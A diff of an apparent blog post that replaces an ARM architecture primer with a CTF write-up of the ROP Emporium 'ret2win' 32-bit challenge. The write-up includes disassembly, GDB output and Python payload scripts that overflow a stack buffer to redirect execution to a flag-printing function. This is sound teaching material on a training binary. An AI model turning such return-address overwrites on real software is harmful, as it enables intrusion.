@@ -2,118 +2,273 @@
 title: "ROP Emporium - ret2win"
 categories: [Binary, Exploitation]
 tags: [x86, x86_64, ARMv5, ARM, MIPS, ret2win]
-# icon: fas fa-info-circle
-# order: 4
-# layout: home
 
 ---
 
+## ret2win
 
-## 1. Setting Up the Environment
+**ret2win** (short for "return-to-win") challenges involve exploiting a buffer overflow to overwrite a function’s return address, redirecting execution to a hidden “win” or “ret2win” function that prints a flag.
 
+The give binary has a `ret2win` function which we need to call. 
 
-If you are on an x86-based system (like a typical PC), you can use QEMU to emulate an ARM processor.
+## x86 (`ret2win32`)
 
-```bash
-sudo apt update
-sudo apt install qemu qemu-user qemu-system-arm gcc-arm-linux-gnueabi gdb-multiarch
+The binary contains a function called `pwnme`, which is vulnerable to a buffer overflow.
+
+```c
+int pwnme()
+{
+  _BYTE s[40]; // [esp+0h] [ebp-28h] BYREF
+
+  memset(s, 0, 0x20u);
+  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
+  puts("What could possibly go wrong?");
+  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
+  printf("> ");
+  read(0, s, 0x38u);
+  return puts("Thank you!");
+}
 ```
 
-**Running an ARM Linux System on QEMU**
+The `ret2win` function is defined as:
 
-To run an ARM Linux system, you can use a prebuilt image:
-
-```bash
-qemu-system-arm -M versatilepb -kernel vmlinuz-arm -hda rootfs.img -append "root=/dev/sda"
+```c
+int ret2win()
+{
+  puts("Well done! Here's your flag:");
+  return system("/bin/cat flag.txt");
+}
 ```
 
-## **2. Introduction to ARM Architecture**
+If you carefully look at the `pwnme` function, you'll notice it reads `0x38` bytes (which is `56` bytes) of user input into the buffer `s[40]`.  
+Since this buffer is allocated on the stack, writing more data than it can hold causes a **stack overflow**.
 
-ARM (Advanced RISC Machine) is a RISC (Reduced Instruction Set Computing) architecture widely used in mobile devices, embedded systems, and IoT applications.
+Following is the disassembly of `pwnme`:
 
-### **ARM vs. x86: Key Differences**
+```bash
+pwndbg> disass pwnme 
+Dump of assembler code for function pwnme:
+   0x080485ad <+0>:	push   ebp
+   0x080485ae <+1>:	mov    ebp,esp
+   0x080485b0 <+3>:	sub    esp,0x28
+   0x080485b3 <+6>:	sub    esp,0x4
+   0x080485b6 <+9>:	push   0x20
+   0x080485b8 <+11>:	push   0x0
+   0x080485ba <+13>:	lea    eax,[ebp-0x28]
+   0x080485bd <+16>:	push   eax
+   0x080485be <+17>:	call   0x8048410 <memset@plt>
+   0x080485c3 <+22>:	add    esp,0x10
+   0x080485c6 <+25>:	sub    esp,0xc
+   0x080485c9 <+28>:	push   0x8048708
+   0x080485ce <+33>:	call   0x80483d0 <puts@plt>
+   0x080485d3 <+38>:	add    esp,0x10
+   0x080485d6 <+41>:	sub    esp,0xc
+   0x080485d9 <+44>:	push   0x8048768
+   0x080485de <+49>:	call   0x80483d0 <puts@plt>
+   0x080485e3 <+54>:	add    esp,0x10
+   0x080485e6 <+57>:	sub    esp,0xc
+   0x080485e9 <+60>:	push   0x8048788
+   0x080485ee <+65>:	call   0x80483d0 <puts@plt>
+   0x080485f3 <+70>:	add    esp,0x10
+   0x080485f6 <+73>:	sub    esp,0xc
+   0x080485f9 <+76>:	push   0x80487e8
+   0x080485fe <+81>:	call   0x80483c0 <printf@plt>
+   0x08048603 <+86>:	add    esp,0x10
+   0x08048606 <+89>:	sub    esp,0x4
+   0x08048609 <+92>:	push   0x38
+   0x0804860b <+94>:	lea    eax,[ebp-0x28]
+   0x0804860e <+97>:	push   eax
+   0x0804860f <+98>:	push   0x0
+   0x08048611 <+100>:	call   0x80483b0 <read@plt>
+   0x08048616 <+105>:	add    esp,0x10
+   0x08048619 <+108>:	sub    esp,0xc
+   0x0804861c <+111>:	push   0x80487eb
+   0x08048621 <+116>:	call   0x80483d0 <puts@plt>
+   0x08048626 <+121>:	add    esp,0x10
+   0x08048629 <+124>:	nop
+   0x0804862a <+125>:	leave  
+   0x0804862b <+126>:	ret  
+```
 
-|Feature|ARM|x86|
-|---|---|---|
-|**Architecture Type**|RISC (Reduced Instruction Set Computing)|CISC (Complex Instruction Set Computing)|
-|**Instruction Size**|Fixed (mostly 32-bit, some 16-bit Thumb)|Variable (1-15 bytes)|
-|**Power Efficiency**|High (used in mobile devices)|Lower (used in PCs/servers)|
-|**Instruction Execution**|Load-Store Architecture (separate memory & register operations)|Register-Memory Architecture|
-|**Endianness**|Mostly Little-Endian (configurable)|Little-Endian (x86)|
-|**Register Count**|More General-Purpose Registers|Fewer Registers|
-|**Privilege Levels**|Multiple CPU Modes (User, Supervisor, etc.)|Ring Levels (Ring 0-3)|
+Notice that `read@plt` receives its arguments via the stack, with arguments pushed **from right to left** as per the **x86 calling convention** (which we discussed earlier).
+
+Now, let's set a breakpoint at `*pwnme + 100` (just before the `read` call):
+
+```bash
+pwndbg> b *pwnme + 100
+Breakpoint 1 at 0x8048611
+pwndbg> r
+ ► 0x8048611 <pwnme+100>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/12)
+        buf: 0xffffd500 ◂— 0
+        nbytes: 0x38
+
+```
+
+Here, our buffer is located at `0xffffd500`, which corresponds to `[ebp-0x28]`.
+
+This means:
+
+- Writing beyond `0x28` bytes will **overwrite the saved `ebp`** (base pointer).
+- Writing even further allows you to **overwrite the saved return address**, giving you control over program execution.
+
+Before we dive deeper, let's first understand what **function prologue** and **epilogue** are. These are common patterns you’ll see in almost every function in low-level programming, especially in assembly or when analyzing binaries.
+
+**Prologue**
+
+The **function prologue** is the set of assembly instructions at the start of a function that prepares the **stack frame** for that function’s execution.
+
+```c
+push rbp       ; Save caller’s RBP
+mov rbp, rsp   ; RBP points to the current stack frame
+sub  rsp, 0x20      ; Reserve 32 bytes for local variables
+```
+
+**Epilogue**
+
+The **epilogue** cleans up the stack before returning from the function.
+
+```c
+mov rsp, rbp     ; Reset stack pointer
+pop rbp          ; Restore caller's frame pointer
+ret              ; Pop return address from stack and jump there
+```
+
+You will find something like :
+
+```c
+leave   ; shorthand for `mov rsp, rbp` + `pop rbp`
+ret     ; Return to caller
+```
+
+By overwriting the return address with our desired address, we can control where the program jumps next. When the function executes the `ret` instruction, it will load our address into **EIP** and transfer execution there.
+
+**Note:** In the stack diagram I’ve shown, the stack grows from **higher** to **lower** memory addresses (which is how stacks typically behave in most systems).
+
+![Stack Diagram](/assets/img/x86.png)
+
+Let’s craft an exploit to overwrite the return address and redirect execution.
+
+Here’s a simple Python script to generate our payload:
+
+```python
+#!/usr/bin/python3
+import sys
+
+payload = b'A' * 0x28           # Fill buffer (40 bytes)
+payload += b'B' * 0x4           # Overwrite saved EBP (4 bytes on 32-bit)
+payload += b'C' * 0x4           # Overwrite saved return address (EIP)
+
+sys.stdout.buffer.write(payload)
+
+```
+
+We’ll save this to a file and test it in **GDB**:
+
+```bash
+python exp.py > exp.txt
+
+gdb ./ret2win32
+pwndbg> r < exp.txt
+```
+
+Here’s what happens:
+
+```bash
+0x43434343 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────
+ EAX  0xb
+ EBX  0xf7f90000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
+ ECX  0xf7f919b4 (_IO_stdfile_1_lock) ◂— 0
+ EDX  1
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
+ ESI  0xffffd604 —▸ 0xffffd7dc ◂— '/home/fury/Desktop/Challs/CTF/pwn/rop_emporium/1-ret2win/1-32bit/ret2win32'
+ EBP  0x42424242 ('BBBB')
+ ESP  0xffffd530 ◂— 1
+ EIP  0x43434343 ('CCCC')
+─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
+Invalid address 0x43434343
 
 
-### **ARM Processor Modes**
+```
 
-ARM CPUs operate in different modes based on privilege level and interrupt handling:
+Boom! We get a **segmentation fault**—as expected. The **EIP** is overwritten with `0x43434343` (`CCCC`), and the saved **EBP** is `0x42424242` (`BBBB`).
 
-|Mode|Description|
-|---|---|
-|**User Mode**|Used by applications, limited system access|
-|**Supervisor Mode**|Kernel mode for OS execution|
-|**IRQ Mode**|Handles normal interrupts|
-|**FIQ Mode**|Handles fast interrupts|
-|**Abort Mode**|Used when a memory access fails|
-|**Undef Mode**|Handles undefined instructions|
-|**System Mode**|Like Supervisor mode but accessible from User Mode|
+Now we just need to replace `CCCC` with the actual address of the `ret2win` function.
 
-ARM switches modes using exceptions (interrupts, system calls).
+Let’s find its address:
 
-### **Registers in ARM**
+```bash
+nm ./ret2win32 | grep ret2win
+0804862c t ret2win
 
-ARM has 16 general-purpose registers (`R0-R15`), plus special registers:
+```
 
-| Register   | Description                                                                                     |
-|------------|-------------------------------------------------------------------------------------------------|
-| R0-R3     | Used for function arguments and return values (up to 4 parameters).                            |
-| R4-R7     | Callee-saved registers (used by functions but must be preserved across function calls).        |
-| R8-R12    | General-purpose registers.                                                                       |
-| R13 (SP)  | Stack Pointer. Points to the current top of the stack.                                         |
-| R14 (LR)  | Link Register. Stores the return address from function calls.                                   |
-| R15 (PC)  | Program Counter. Holds the address of the next instruction to execute.                          |
-| CPSR      | Current Program Status Register. Contains flags like Zero, Negative, Overflow, Carry, Interrupts, etc. |
-| SPSR      | Saved Program Status Register. Holds the CPSR during exception handling and mode switching.    |
+Now we modify our script to use this address instead of `CCCC`:
 
+```python
+#!/usr/bin/python
+import sys
 
-### **Endianness in ARM**
+payload = b'A'*0x28
+payload += b'B'*0x4
+#payload += b'C'*0x4
+payload += b"\x08\x04\x86\x2c" # 0x0804862c
+sys.stdout.buffer.write(payload)
 
-- **Little-Endian**: Stores the least significant byte first (default in ARM).
-- **Big-Endian**: Stores the most significant byte first.
-- ARM processors support both, but most modern systems use **Little-Endian**.
-    
-The **AAPCS** (ARM Architecture Procedure Call Standard) defines the rules for how functions are called and how parameters are passed between functions in ARM-based systems. It's a key standard for ensuring consistent calling conventions across different ARM implementations.
+```
 
-### Key Points of AAPCS (ARM Procedure Call Standard):
+Testing it in GDB:
 
-1. **Function Arguments (Registers R0 - R3)**
-	- The first four arguments to a function are passed using registers **R0 - R3**.
-	- If a function requires more than four arguments, the additional parameters are passed on the stack.
-        
-2. **Return Values (R0 - R1)**
-	- The return value of a function is usually stored in **R0**. **R0** for single return values, **R1** for multi-word returns.
-        
-3. **Registers for Local Variables:**
-    - **R4 - R7**: Callee-saved registers (must be preserved by the function if modified).
-    - **R8 - R12**: Additional registers that can be used freely by functions but must be saved if used across function calls.
-        
-4. **Link Register (LR):**
-    - **LR (R14)**: Stores the return address when a function is called. The callee is responsible for saving it if necessary.
-        
-5. **Stack Pointer (SP) and Frame Pointer (FP):**
-    - **SP (R13)**: The stack pointer points to the top of the stack.
-    - **FP (R7/R11)**: The frame pointer points to the start of the current function’s stack frame (R7/R11 is used as the frame pointer in many ARM-based systems).
-        
-6. **Callee vs Caller-Saved Registers:**
-    - **Callee-saved**: Registers that the called function must preserve if it modifies them (e.g., **R4 - R7**).
-    - **Caller-saved**: Registers that the calling function must preserve if it needs their values after a function call (e.g., **R0 - R3**, **LR**).
-        
-7. **Stack Alignment:**
-    - The stack must be aligned to 8-byte boundaries on function entry.
+```bash
+python exp.py > exp.txt
 
-#### **Exception Handling**
+gdb ./ret2win32
+# ...
+ EBP  0x42424242 ('BBBB')
+ ESP  0xffffd530 ◂— 1
+ EIP  0x2c860408
+─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
+Invalid address 0x2c860408
 
-- During an interrupt or exception, ARM saves the current state of the program (CPSR and registers) and switches to a special mode (like IRQ or FIQ mode). The stack is used to save and restore the program state when returning from an exception.
+```
 
----
+Hmm... We see that the value of **EIP** is `0x2c860408`, which is the exact reverse of `0x0804862c`. This happens because the **x86 architecture uses little-endian byte order**, meaning the least significant byte is stored first in memory.
+
+Let’s correct our payload:
+
+```python
+#!/usr/bin/python3
+import sys
+
+payload = b'A'*0x28
+payload += b'B'*0x4
+#payload += b'C'*0x4
+payload += b"\x2c\x86\x04\x08" # 0x0804862c  Correct little-endian address of ret2win
+sys.stdout.buffer.write(payload)
+
+```
+
+Now we run our exploit:
+
+```bash
+./exp.py | ./ret2win32 
+ret2win by ROP Emporium
+x86
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+Segmentation fault (core dumped)
+
+```
+
+Success! We’ve successfully called the `ret2win` function and captured the flag.
+
+**Note:** After calling `ret2win`, we get a segmentation fault because the program continues execution beyond that point. We’ll cover why that happens later.
 
